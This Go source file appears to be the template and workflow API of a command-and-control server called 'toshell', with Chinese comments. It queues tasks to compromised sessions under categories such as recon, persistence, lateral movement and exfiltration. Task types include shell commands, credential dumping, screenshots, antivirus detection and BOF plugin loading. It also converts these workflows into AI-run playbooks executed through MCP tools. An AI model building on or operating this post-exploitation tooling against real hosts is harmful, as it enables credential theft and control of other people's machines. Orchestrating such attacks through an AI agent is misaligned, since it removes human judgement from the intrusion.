package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
	"toshell/internal/server/ai"
	"toshell/internal/server/database"
	"toshell/internal/server/logging"
	"toshell/internal/server/task"
)

// ─── Data Structures ──────────────────────────────────────────────────────────

type TaskTemplate struct {
	ID          string         `json:"id"`
	Name        string         `json:"name"`
	Description string         `json:"description"`
	Category    string         `json:"category"` // "recon", "persistence", "lateral", "exfil", "quick"
	Tasks       []TemplateTask `json:"tasks"`
	CreatedAt   int64          `json:"created_at"`
}

type TemplateTask struct {
	TaskType string `json:"task_type"`
	Data     string `json:"data"`
	Timeout  int    `json:"timeout"`
	Wait     bool   `json:"wait"`
}

type WorkflowExecution struct {
	ID        string               `json:"id"`
	SessionID string               `json:"session_id"`
	Template  string               `json:"template"`
	Status    string               `json:"status"` // "running", "completed", "failed"
	Progress  int                  `json:"progress"`
	Total     int                  `json:"total"`
	Results   []WorkflowTaskResult `json:"results"`
	CreatedAt int64                `json:"created_at"`
	// mu 保护 Status/Progress/Results 的并发读写：
	// executeWorkflow 在后台 goroutine 中更新，getWorkflowStatus 并发读取。
	mu sync.RWMutex `json:"-"`
}

type WorkflowTaskResult struct {
	TaskType string `json:"task_type"`
	TaskID   uint64 `json:"task_id"`
	Status   string `json:"status"`
	Output   string `json:"output,omitempty"`
}

// ─── Template Store ───────────────────────────────────────────────────────────

type templateStore struct {
	mu        sync.RWMutex
	templates map[string]*TaskTemplate
	workflows map[string]*WorkflowExecution
}

var tplStore = &templateStore{
	templates: make(map[string]*TaskTemplate),
	workflows: make(map[string]*WorkflowExecution),
}

// No built-in templates — all templates are user-created and persisted in DB.
func init() {}

// ─── Helpers ──────────────────────────────────────────────────────────────────

func (s *Server) pushTemplateTask(sessionID string, tt TemplateTask) (*WorkflowTaskResult, error) {
	timeout := tt.Timeout
	if timeout <= 0 {
		timeout = 60
	}

	taskInfo, err := s.taskMgr.Create(sessionID, task.TaskParams{
		TaskType: tt.TaskType,
		Data:     tt.Data,
		Timeout:  uint32(timeout),
	})
	if err != nil {
		return nil, err
	}

	if err := s.listener.PushTask(sessionID, taskInfo); err != nil {
		return nil, err
	}

	return &WorkflowTaskResult{
		TaskType: tt.TaskType,
		TaskID:   taskInfo.ID,
		Status:   "running",
	}, nil
}

// waitForTask polls the task status until it completes or fails.
func (s *Server) waitForTask(taskID uint64, timeoutSec int) string {
	if timeoutSec <= 0 {
		timeoutSec = 60
	}
	deadline := time.After(time.Duration(timeoutSec) * time.Second)
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-deadline:
			s.taskMgr.Fail(taskID, "workflow task timeout")
			return "timeout"
		case <-ticker.C:
			t, err := s.taskMgr.Get(taskID)
			if err != nil {
				return "failed"
			}
			switch t.Status {
			case task.StatusCompleted:
				return "completed"
			case task.StatusFailed, task.StatusTimeout:
				return "failed"
			}
		}
	}
}

// collectOutput retrieves the output from a completed task.
func (s *Server) collectOutput(taskID uint64) string {
	t, err := s.taskMgr.Get(taskID)
	if err != nil {
		return ""
	}
	if t.Output != "" {
		return t.Output
	}
	return t.Error
}

// executeWorkflow runs the task sequence in a goroutine.
func (s *Server) executeWorkflow(wf *WorkflowExecution, tmpl *TaskTemplate) {
	sessionID := wf.SessionID
	total := len(tmpl.Tasks)
	const maxTasks = 10

	limit := total
	if limit > maxTasks {
		limit = maxTasks
	}

	for i := 0; i < limit; i++ {
		tt := tmpl.Tasks[i]

		// Push task
		result, err := s.pushTemplateTask(sessionID, tt)
		if err != nil {
			logging.Error("api", "Workflow %s: failed to push task %d (%s): %v",
				wf.ID, i+1, tt.TaskType, err)
			wf.mu.Lock()
			wf.Status = "failed"
			wf.Progress = i
			wf.Results = append(wf.Results, WorkflowTaskResult{
				TaskType: tt.TaskType,
				Status:   "failed",
				Output:   err.Error(),
			})
			wf.mu.Unlock()
			return
		}

		wf.mu.Lock()
		wf.Results = append(wf.Results, *result)
		wf.Progress = i + 1
		wf.mu.Unlock()
		logging.Info("api", "Workflow %s: task %d/%d (%s) pushed as task_id=%d",
			wf.ID, i+1, total, tt.TaskType, result.TaskID)

		// If Wait, poll until complete
		if tt.Wait {
			status := s.waitForTask(result.TaskID, tt.Timeout)
			wf.mu.Lock()
			if i < len(wf.Results) {
				wf.Results[i].Status = status
				output := s.collectOutput(result.TaskID)
				wf.Results[i].Output = output
			}
			wf.mu.Unlock()

			if status == "failed" || status == "timeout" {
				wf.mu.Lock()
				wf.Status = "failed"
				wf.mu.Unlock()
				logging.Error("api", "Workflow %s: aborted due to task %d failure", wf.ID, i+1)
				return
			}

			logging.Info("api", "Workflow %s: task %d/%d (%s) completed",
				wf.ID, i+1, total, tt.TaskType)
		}
	}

	wf.mu.Lock()
	wf.Status = "completed"
	wf.Progress = limit
	wf.mu.Unlock()
	logging.Info("api", "Workflow %s completed: %d/%d tasks", wf.ID, limit, total)
}

// ─── API Handlers ─────────────────────────────────────────────────────────────

// GET /api/v1/templates
func (s *Server) listTemplatesHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	tplStore.mu.RLock()
	templates := make([]*TaskTemplate, 0, len(tplStore.templates))
	for _, t := range tplStore.templates {
		templates = append(templates, t)
	}
	tplStore.mu.RUnlock()

	// Merge custom templates from database (skip those already in memory)
	// 并发安全：RLock 内绝不写 map（此前在 RLock 内写 tplStore.templates
	// 与并发 GET 产生 concurrent map read and map write panic）。
	if db := database.Get(); db != nil {
		customTemplates, err := db.ListCustomTemplates()
		if err == nil {
			for _, ct := range customTemplates {
				tplStore.mu.RLock()
				_, exists := tplStore.templates[ct.ID]
				tplStore.mu.RUnlock()
				if exists {
					continue // already in memory, skip duplicate
				}
				var tasks []TemplateTask
				if err := json.Unmarshal([]byte(ct.TasksJSON), &tasks); err != nil {
					continue
				}
				templates = append(templates, &TaskTemplate{
					ID:          ct.ID,
					Name:        ct.Name,
					Description: ct.Description,
					Category:    ct.Category,
					Tasks:       tasks,
					CreatedAt:   ct.CreatedAt,
				})
			}
		}
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"templates": templates,
		"count":     len(templates),
	})
}

// POST /api/v1/templates — create a custom template
func (s *Server) createTemplateHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	var req struct {
		Name        string         `json:"name"`
		Description string         `json:"description"`
		Category    string         `json:"category"`
		Tasks       []TemplateTask `json:"tasks"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if req.Name == "" {
		http.Error(w, `{"error":"name is required"}`, http.StatusBadRequest)
		return
	}
	if len(req.Tasks) == 0 {
		http.Error(w, `{"error":"at least one task is required"}`, http.StatusBadRequest)
		return
	}

	tasksJSON, _ := json.Marshal(req.Tasks)
	now := time.Now().Unix()
	tmplID := "custom-" + uuid.New().String()[:8]

	db := database.Get()
	if db == nil {
		http.Error(w, `{"error":"Database not available"}`, http.StatusInternalServerError)
		return
	}

	if err := db.CreateCustomTemplate(&database.CustomTemplate{
		ID:          tmplID,
		Name:        req.Name,
		Description: req.Description,
		Category:    req.Category,
		TasksJSON:   string(tasksJSON),
		CreatedAt:   now,
	}); err != nil {
		http.Error(w, `{"error":"Failed to save template"}`, http.StatusInternalServerError)
		return
	}

	// Add to in-memory cache for lookups (getTemplateHandler / executeWorkflowHandler)
	tplStore.mu.Lock()
	tplStore.templates[tmplID] = &TaskTemplate{
		ID:          tmplID,
		Name:        req.Name,
		Description: req.Description,
		Category:    req.Category,
		Tasks:       req.Tasks,
		CreatedAt:   now,
	}
	tplStore.mu.Unlock()

	json.NewEncoder(w).Encode(map[string]interface{}{
		"id":      tmplID,
		"message": "Template created",
	})
}

// PUT /api/v1/templates/{id} — update a custom template
func (s *Server) updateTemplateHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	tplStore.mu.RLock()
	_, exists := tplStore.templates[id]
	tplStore.mu.RUnlock()
	if !exists {
		http.Error(w, `{"error":"Template not found"}`, http.StatusNotFound)
		return
	}

	var req struct {
		Name        string         `json:"name"`
		Description string         `json:"description"`
		Category    string         `json:"category"`
		Tasks       []TemplateTask `json:"tasks"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if req.Name == "" {
		http.Error(w, `{"error":"name is required"}`, http.StatusBadRequest)
		return
	}

	now := time.Now().Unix()
	tasksJSON, _ := json.Marshal(req.Tasks)

	db := database.Get()
	if db != nil {
		if err := db.UpdateCustomTemplate(id, req.Name, req.Description, req.Category, string(tasksJSON)); err != nil {
			http.Error(w, `{"error":"Failed to update template"}`, http.StatusInternalServerError)
			return
		}
	}

	tplStore.mu.Lock()
	tplStore.templates[id] = &TaskTemplate{
		ID:          id,
		Name:        req.Name,
		Description: req.Description,
		Category:    req.Category,
		Tasks:       req.Tasks,
		CreatedAt:   now,
	}
	tplStore.mu.Unlock()

	json.NewEncoder(w).Encode(map[string]interface{}{
		"message": "Template updated",
	})
}

// DELETE /api/v1/templates/{id} — delete a template
// 所有模板（含初始 seed 的内置示例）都可在 Templates 页编辑/删除；作为普通模板对待。
func (s *Server) deleteTemplateHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	db := database.Get()
	if db == nil {
		http.Error(w, `{"error":"Database not available"}`, http.StatusInternalServerError)
		return
	}

	if err := db.DeleteCustomTemplate(id); err != nil {
		http.Error(w, `{"error":"Failed to delete template"}`, http.StatusInternalServerError)
		return
	}

	tplStore.mu.Lock()
	delete(tplStore.templates, id)
	tplStore.mu.Unlock()

	json.NewEncoder(w).Encode(map[string]string{"message": "Template deleted"})
}

// GET /api/v1/templates/{id}
func (s *Server) getTemplateHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	tplStore.mu.RLock()
	tmpl, ok := tplStore.templates[id]
	tplStore.mu.RUnlock()

	if !ok {
		http.Error(w, `{"error":"template not found"}`, http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(tmpl)
}

// POST /api/v1/sessions/{id}/workflow
// 任务流已统一合并到剧本（PlaybookRunner）：模板转剧本后异步执行，进度由剧本 run 承载。
func (s *Server) executeWorkflowHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	sessionID := vars["id"]

	if s.playbookR == nil {
		http.Error(w, `{"error":"Playbook runner not available"}`, http.StatusServiceUnavailable)
		return
	}

	var req struct {
		TemplateID string `json:"template_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	tmpl := s.lookupTemplate(req.TemplateID)
	if tmpl == nil {
		http.Error(w, `{"error":"template not found"}`, http.StatusNotFound)
		return
	}

	// 模板转剧本执行：run.ID 作为 workflow_id 返回，前端逻辑不变
	run, err := s.playbookR.Run(req.TemplateID, sessionID)
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"workflow_id": run.ID,
		"template":    tmpl.Name,
		"total_tasks": len(tmpl.Tasks),
		"message":     "Workflow started",
	})
}

// GET /api/v1/workflows/{id}
func (s *Server) getWorkflowStatusHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	if s.playbookR == nil {
		http.Error(w, `{"error":"Playbook runner not available"}`, http.StatusServiceUnavailable)
		return
	}
	run := s.playbookR.GetRun(id)
	if run == nil {
		http.Error(w, `{"error":"workflow not found"}`, http.StatusNotFound)
		return
	}

	results := run.Snapshot()
	cp := WorkflowExecution{
		ID:        run.ID,
		SessionID: run.SessionID,
		Template:  run.Playbook,
		Status:    run.StatusSafe(),
		Total:     len(results),
		CreatedAt: run.CreatedAt,
	}
	done := 0
	for _, st := range results {
		if st.Status == "completed" {
			done++
		}
		cp.Results = append(cp.Results, WorkflowTaskResult{
			TaskType: st.Tool, TaskID: st.TaskID, Status: st.Status,
			Output: firstNonEmpty(st.Output, st.Error),
		})
	}
	cp.Progress = done

	json.NewEncoder(w).Encode(&cp)
}

// ─── 模板 → 剧本适配（任务流统一合并到剧本系统）───────────────────────

// resolveTemplatePlaybook 供 PlaybookRunner 的 resolver 回调：按 id 解析模板为剧本。
func (s *Server) resolveTemplatePlaybook(id string) *ai.Playbook {
	tmpl := s.lookupTemplate(id)
	if tmpl == nil {
		return nil
	}
	return templateToPlaybook(tmpl)
}

// lookupTemplate 从内存模板缓存查找；未命中时回退从数据库加载并写回缓存。
// 解决 server 重启后模板已持久化但内存缓存为空导致"template not found"的问题。
func (s *Server) lookupTemplate(id string) *TaskTemplate {
	tplStore.mu.RLock()
	tmpl, ok := tplStore.templates[id]
	tplStore.mu.RUnlock()
	if ok {
		return tmpl
	}
	if db := database.Get(); db != nil {
		cts, err := db.ListCustomTemplates()
		if err == nil {
			for _, ct := range cts {
				if ct.ID == id {
					var tasks []TemplateTask
					if json.Unmarshal([]byte(ct.TasksJSON), &tasks) != nil {
						return nil
					}
					t := &TaskTemplate{
						ID: ct.ID, Name: ct.Name, Description: ct.Description,
						Category: ct.Category, Tasks: tasks, CreatedAt: ct.CreatedAt,
					}
					tplStore.mu.Lock()
					tplStore.templates[id] = t
					tplStore.mu.Unlock()
					return t
				}
			}
		}
	}
	return nil
}

// templateToPlaybook 把一个模板（TaskTemplate）转换为剧本（Playbook），
// 使任务流/模板执行完全复用 PlaybookRunner（run 跟踪/失败策略/并行/AI 总结）。
func templateToPlaybook(t *TaskTemplate) *ai.Playbook {
	steps := make([]ai.PlaybookStep, 0, len(t.Tasks))
	for i, tt := range t.Tasks {
		args := map[string]string{"session_id": "${session_id}"}
		cmd := ""
		var path, action, pluginID string
		if tt.Data != "" {
			var m map[string]interface{}
			if json.Unmarshal([]byte(tt.Data), &m) == nil {
				if v, ok := m["command"].(string); ok {
					cmd = v
				}
				if v, ok := m["path"].(string); ok {
					path = v
				}
				if v, ok := m["action"].(string); ok {
					action = v
				}
				if v, ok := m["plugin_id"].(string); ok {
					pluginID = v
				}
			} else {
				cmd = tt.Data
			}
		}
		tool := mapTemplateTool(tt.TaskType)
		switch tool {
		case "task_submit":
			if cmd == "" {
				cmd = defaultTemplateCommand(tt.TaskType)
			}
			args["command"] = cmd
		case "file_list":
			if path == "" {
				path = "C:\\"
			}
			args["path"] = path
		case "credentials":
			if action == "" {
				action = "all"
			}
			args["action"] = action
		case "plugin_load":
			args["plugin_id"] = pluginID
		}
		timeout := tt.Timeout
		if timeout <= 0 {
			timeout = 60
		}
		steps = append(steps, ai.PlaybookStep{
			Name:     fmt.Sprintf("步骤%d-%s", i+1, tt.TaskType),
			Tool:     tool,
			Args:     args,
			Wait:     true,
			Timeout:  timeout,
			ExpectOK: false,
		})
	}
	return &ai.Playbook{ID: t.ID, Name: t.Name, Desc: t.Description, Steps: steps, Fallback: "continue"}
}

// mapTemplateTool 模板任务类型 → MCP 工具名。
func mapTemplateTool(taskType string) string {
	switch taskType {
	case "shell", "sysinfo", "service_list", "netstat", "av_detect":
		return "task_submit"
	case "process_list":
		return "process_list"
	case "file_list":
		return "file_list"
	case "screenshot":
		return "screenshot"
	case "credentials":
		return "credentials"
	case "bof_load":
		return "plugin_load"
	default:
		return "task_submit"
	}
}

// defaultTemplateCommand 无命令时按任务类型给默认命令。
func defaultTemplateCommand(taskType string) string {
	switch taskType {
	case "sysinfo":
		return "systeminfo"
	case "netstat":
		return "netstat -ano"
	case "service_list":
		return "sc queryex type= service state= all"
	case "av_detect":
		return "tasklist /v /fo csv"
	default:
		return "whoami"
	}
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}

// ─── 内置剧本 → 任务模板 seed（可编辑/可删除的初始示例）────────────

// seedBuiltinTemplates 首次启动时（数据库无任何模板）把内置剧本写入 custom_templates
// 作为初始示例模板，之后它们就是普通模板：可在 Templates 页编辑、删除。若用户已
// 创建过模板（视为已初始化）则不再 seed，避免覆盖用户数据。
func (s *Server) seedBuiltinTemplates() {
	db := database.Get()
	if db == nil {
		return
	}
	existing, err := db.ListCustomTemplates()
	if err != nil || len(existing) > 0 {
		return // 已有模板 → 用户已初始化，不再 seed
	}
	for _, pb := range ai.BuiltinPlaybooks {
		t := builtinToTemplate(pb)
		tasksJSON, _ := json.Marshal(t.Tasks)
		ct := &database.CustomTemplate{
			ID: t.ID, Name: t.Name, Description: t.Description,
			Category: t.Category, TasksJSON: string(tasksJSON), CreatedAt: t.CreatedAt,
		}
		if err := db.CreateCustomTemplate(ct); err != nil {
			logging.Warn("api", "seed builtin template %s failed: %v", t.ID, err)
			continue
		}
		tplStore.mu.Lock()
		tplStore.templates[t.ID] = t
		tplStore.mu.Unlock()
		logging.Info("api", "seeded builtin taskflow '%s' as editable template", t.Name)
	}
}

// builtinToTemplate 把一个内置剧本（Playbook）转成任务模板（TaskTemplate）。
// 嵌套剧本（tool=playbook）递归展开为平面步骤，保证模板是自包含的可编辑步骤列表。
func builtinToTemplate(pb ai.Playbook) *TaskTemplate {
	tasks := []TemplateTask{}
	var flat func(steps []ai.PlaybookStep)
	flat = func(steps []ai.PlaybookStep) {
		for _, st := range steps {
			if st.Tool == "playbook" {
				nestedID := st.Args["playbook"]
				if nestedID != "" {
					if nested := findBuiltinPlaybook(nestedID); nested != nil {
						flat(nested.Steps)
					}
				}
				continue
			}
			tasks = append(tasks, playbookStepToTemplateTask(st))
		}
	}
	flat(pb.Steps)
	return &TaskTemplate{
		ID:          pb.ID,
		Name:        pb.Name,
		Description: pb.Desc,
		Category:    "recon",
		Tasks:       tasks,
		CreatedAt:   time.Now().Unix(),
	}
}

// playbookStepToTemplateTask 一个剧本步骤（tool+args）→ 模板任务（task_type+data）。
func playbookStepToTemplateTask(st ai.PlaybookStep) TemplateTask {
	switch st.Tool {
	case "process_list":
		return TemplateTask{TaskType: "process_list", Data: "{}"}
	case "file_list":
		d, _ := json.Marshal(map[string]string{"path": st.Args["path"]})
		return TemplateTask{TaskType: "file_list", Data: string(d)}
	case "credentials":
		d, _ := json.Marshal(map[string]string{"action": orDefault(st.Args["action"], "all")})
		return TemplateTask{TaskType: "credentials", Data: string(d)}
	case "task_submit":
		cmd := st.Args["command"]
		switch cmd {
		case "systeminfo":
			return TemplateTask{TaskType: "sysinfo", Data: "{}"}
		case "netstat -ano":
			return TemplateTask{TaskType: "netstat", Data: "{}"}
		case "tasklist /v /fo csv":
			return TemplateTask{TaskType: "av_detect", Data: "{}"}
		default:
			d, _ := json.Marshal(map[string]string{"command": cmd})
			return TemplateTask{TaskType: "shell", Data: string(d)}
		}
	case "screenshot":
		return TemplateTask{TaskType: "screenshot", Data: "{}"}
	case "file_download":
		return TemplateTask{TaskType: "shell", Data: "{}"}
	default:
		return TemplateTask{TaskType: "shell", Data: "{}"}
	}
}

func findBuiltinPlaybook(id string) *ai.Playbook {
	for i := range ai.BuiltinPlaybooks {
		if ai.BuiltinPlaybooks[i].ID == id {
			return &ai.BuiltinPlaybooks[i]
		}
	}
	return nil
}

func orDefault(v, def string) string {
	if v == "" {
		return def
	}
	return v
}
